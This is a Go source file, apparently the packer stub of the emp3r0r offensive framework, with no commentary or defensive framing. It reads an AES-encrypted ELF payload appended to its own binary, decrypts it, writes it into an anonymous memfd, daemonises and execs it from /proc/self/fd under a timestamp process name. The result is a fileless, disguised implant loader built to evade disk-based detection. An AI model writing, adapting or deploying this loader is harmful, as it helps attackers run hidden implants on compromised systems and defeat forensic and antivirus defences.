package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"syscall"
	"time"
	"unsafe"

	"github.com/jm33-m0/emp3r0r/packer/internal/utils"
)

const (
	mfdCloexec     = 0x0001
	memfdCreateX64 = 319
	fork           = 57
)

func runFromMemory(procName string, buffer []byte) {
	fdName := "" // *string cannot be initialized

	fd, _, _ := syscall.Syscall(memfdCreateX64, uintptr(unsafe.Pointer(&fdName)), uintptr(mfdCloexec), 0)
	_, _ = syscall.Write(int(fd), buffer)

	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)

	switch child, _, _ := syscall.Syscall(fork, 0, 0, 0); child {
	case 0:
		break
	case 1:
		// Fork failed!
		log.Fatal("fork failed")
		break
	default:
		// Parent exiting...
		os.Exit(0)
	}

	_ = syscall.Umask(0)
	_, _ = syscall.Setsid()
	_ = syscall.Chdir("/")

	file, _ := os.OpenFile("/dev/null", os.O_RDWR, 0)
	syscall.Dup2(int(file.Fd()), int(os.Stdin.Fd()))
	file.Close()

	_ = syscall.Exec(fdPath, []string{procName}, nil)
}

func main() {
	wholeStub, err := ioutil.ReadFile(os.Args[0])
	if err != nil {
		log.Fatal(err)
	}
	// length of the whole stub file
	elfbegining := bytes.LastIndex(wholeStub, []byte(utils.Sep))
	elfBytes := wholeStub[(elfbegining + len(utils.Sep)):]

	// decrypt attached ELF file
	key := utils.GenAESKey(utils.Key)
	elfdata := utils.AESDecrypt(key, elfBytes)
	if elfdata == nil {
		log.Fatal("AESDecrypt failed")
	}

	// write ELF to memory and run it
	procName := fmt.Sprintf("%d", time.Now().UnixNano())
	runFromMemory(procName, elfdata)
}
